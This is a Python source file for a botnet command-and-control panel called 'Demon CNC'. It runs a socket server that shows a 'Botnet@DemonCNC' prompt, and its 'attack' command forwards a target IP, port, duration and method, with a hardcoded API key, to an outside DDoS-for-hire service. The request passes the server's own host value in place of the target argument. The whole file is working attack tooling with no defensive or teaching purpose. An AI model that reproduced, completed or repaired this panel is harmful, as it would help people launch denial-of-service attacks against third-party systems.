#Written By PumpMyZare
#Using Sockets For IP Whitelisting Clients
import sys
import time
import os
import socket
import threading
import requests
import colorama
from colorama import Fore, init

host = "127.0.0.1"
port = 999

sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sck.bind((host, port))
sck.listen(1)


help = '''
\r            Demon CNC Command List
\r
\r            home
\r            credits
\r            loading
\r            roadman
'''
def banner(client):
    client.send("\033]0;Welcome To Your Demon CNC Build\007".encode())
    client.send("\033\143".encode())
    client.send(help.encode())
    main(client)

def main(client):
    client.send("\rBotnet@DemonCNC#: ".encode())
    cmd = client.recv(1024).decode()
    argv = cmd.split(" ")
    if "home" in cmd:
        client.send("\033\143".encode())
        client.send(str(banners("home.tfx", client)).encode())
        main(client)
    elif "credits" in cmd:
        client.send("\033\143".encode())
        client.send(str(banners("credits.tfx", client)).encode())
        main(client)
    elif "cls" in cmd:
        client.send("\033\143".encode())
        client.send(help.encode())
        main(client)
    elif "loading" in cmd:
        client.send(str(gifs("loading.tfx", client)).encode())
        banner(client)
    elif "roadman" in cmd:
        client.send(str(gifs("roadman.tfx", client)).encode())
        banner(client)
    elif "attack" in cmd:
        if len(argv) == 5:
            ip = argv[1]
            port = argv[2]
            time = argv[3]
            method = argv[4]
            try:
                requests.get(f"https://dichvublack.vn/api/?key=RILYtI24wTN4hsXF&host={host}&port={port}&time={time}&method={method}&vip=0")
                client.send("\rAttack sent!\n".encode())
                main(client)
            except:
                client.send("\rAPI Error Check Your Demon CNC Build For Errors!\n".encode())
                main(client)
        else:
            client.send("\rUsage: attack <ip> <port> <time> <method>\n".encode())
            main(client)
        
    else:
        main(client)
def banners(file, client):
    with open(f'UI/{file}', encoding='utf-8') as file:
        for line in file:
            client.send(f"\r{line}".encode())
        main(client)





def loading(client):
    client.send("\033\143".encode())
    client.send("\rDemon CNC Authorizing Your CNC Build\n".encode())
    time.sleep(3)
    banner(client)

def gifs(file, client):
    with open(f'TermFX/Gifs/{file}', encoding='utf-8') as file:
        for line in file:
            client.send(f"\r{line}".encode())
            time.sleep(0.00000000000000000000000000000000000000000000000001)

def listener():
    while True:
        print("Successfully Screened Demon CNC")
        client, address = sck.accept()
        threading.Thread(target=loading, args=(client,)).start()
listener()